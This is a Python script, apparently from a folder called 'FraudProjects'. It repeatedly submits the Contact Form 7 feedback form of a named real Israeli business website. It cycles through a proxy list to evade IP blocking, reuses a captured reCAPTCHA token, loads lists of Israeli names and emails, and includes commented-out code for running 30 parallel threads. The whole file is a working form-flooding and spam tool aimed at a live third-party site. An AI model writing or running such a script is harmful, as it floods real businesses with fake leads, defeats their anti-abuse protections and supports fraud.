import time
import requests
import random
import string
import threading


url = 'https://everst.co.il/wp-json/contact-form-7/v1/contact-forms/425/feedback'
emails = ['@yahoo.com', '@gmail.com', '@outlook.com', '@walla.co.il']

with open('../FraudProjects/data/israeli_names.csv', 'r', encoding='utf-8') as f, open(
        '../FraudProjects/data/emails.csv', 'r', encoding='utf-8') as g:
    names = f.read().split()
    emails = g.read().split()
with open('data/proxies.csv', 'r') as f:
    proxies = f.read().split()

def do_requests():
    i = 0
    flag = 0
    while True:
        proxy = proxies[i]
        data = {
            '_wpcf7': '425',
            '_wpcf7_version': '5.1.1',
            '_wpcf7_locale': 'en_US',
            '_wpcf7_unit_tag': 'wpcf7-f425-p398-o1',
            '_wpcf7_container_post': '398',
            'g-recaptcha-response': '03AGdBq27r6ISfmnMV68Zu9S2rqp3Sx-oSdKRq9M3HWkCvbiFi6YHeSuQ7LTaVtpEQtX5MdxAbF1ETXhY0R1UCcv97Mm5mDgUQUMUH78fA08N2cb7FgUEtafS5evQaxQKdsboF4FKc7vzFDdC5qzXrMctnu-6LbPW3W-LGHyHEgcuFa3OVBzEM6Z516hKUUn4Qs_uEJ-C73JaHLndtLGyvgLz4OUptScsIm3fSKYowf6is_xBdGQhq9IXssI2ouguJikhsLaXzYRjgH108TvmPB-pOTBFozndflw9BCK17zX4wpoXBstUyKILgMz7vy6RA77H21U6ZXDxfer_HSRYi40DkOtdcWLsqohuuF0QA2aS5uXiWKkQb51tBXSdjly1ozBKSwocX2EgKfKx6hHDWaFm5_nLK_v-A5OkMFFzDgAuibFV9QZa05rQ',
            'text-967': 'בדיקה לא להתקשר',
            'tel-284': '05555555555',
            'email-276': 'test@mail.com',
            'ip': proxy
        }


        try:
            # response = requests.get(url=url, proxies={'http': 'http' + proxy, 'https://': 'http://' + proxy}, timeout=3)
            # print(response.json())
            response = requests.post(url=url, data=data,
                                     proxies={'http': 'http://' + proxy, 'https:': 'http://' + proxy}, timeout=3)
            if 'true' in response.text:
                print(response.text, 'Sending details: ', [data[j] for j in data][4:7])
            else:
                flag += 1



        except:
            print("Skipping. Connnection error")
            i += 1
            flag = 0
            print('trying proxy - ', proxies[i+1])

        if flag > 20:
            i += 1
            flag = 0
            print('reached 1000 flags, trying proxy - ', proxies[i+1])

do_requests()
# threads = []
# for i in range(30):
#     t = threading.Thread(target=do_requests)
#     t.daemon = True
#     threads.append(t)
#
# for i in range(30):
#     threads[i].start()
#
# for i in range(30):
#     threads[i].join()
